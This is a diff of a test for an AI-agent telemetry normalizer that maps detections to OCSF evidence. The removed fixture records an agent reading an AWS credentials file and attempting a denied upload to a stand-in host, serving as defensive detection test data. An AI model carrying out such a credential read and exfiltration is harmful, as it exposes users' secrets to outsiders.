@@ -1,74 +1,8 @@
 // The tool calls behind a detection become evidence. They do not inherit the
 // finding's actor, and approval gates without a tool call add none.
-from {
-  event_id: "names-only",
-  detection: {
-    artifacts: {
-      items: [
-        {
-          event_id: "read",
-          source: {app: "claude"},
-          action: {type: "tool_called", outcome: "success"},
-          tool: {name: "Read", server: "claude"},
-        },
-        {
-          event_id: "shell",
-          source: {app: "claude"},
-          action: {type: "tool_called", outcome: "success"},
-          tool: {name: "Bash", server: "shell"},
-        },
-      ],
-    },
-  },
-},
-{
-  event_id: "captured-arguments",
-  detection: {
-    artifacts: {
-      items: [
-        {
-          event_id: "read",
-          source: {app: "claude"},
-          action: {type: "tool_called", outcome: "success"},
-          tool: {
-            name: "Read",
-            server: "claude",
-            arguments: {file_path: "/home/alice/.aws/credentials"},
-          },
-        },
-        {
-          event_id: "fetch",
-          source: {app: "claude"},
-          action: {type: "tool_called", outcome: "denied"},
-          tool: {
-            name: "fetch",
-            server: "web",
-            arguments: {url: "https://upload.example.com/ingest"},
-          },
-        },
-      ],
-    },
-  },
-},
-{
-  event_id: "approval-gate",
-  detection: {
-    artifacts: {
-      items: [
-        {
-          event_id: "approval",
-          source: {app: "claude"},
-          action: {type: "approval_response", outcome: "approved"},
-          gated_action: {tool: "Bash", server: "shell"},
-        },
-      ],
-    },
-  },
+from_file env("TENZIR_INPUT") {
+  read_ndjson
 }
-timestamp_utc = 2026-11-10T12:00:00Z
-correlation_id = "session-1"
-actor = {type: "user", id: "alice"}
-action = {type: "detection", outcome: "high"}
 agentmetry::ocsf::normalize
 this = ocsf_cast(this)
 select metadata.uid, evidences
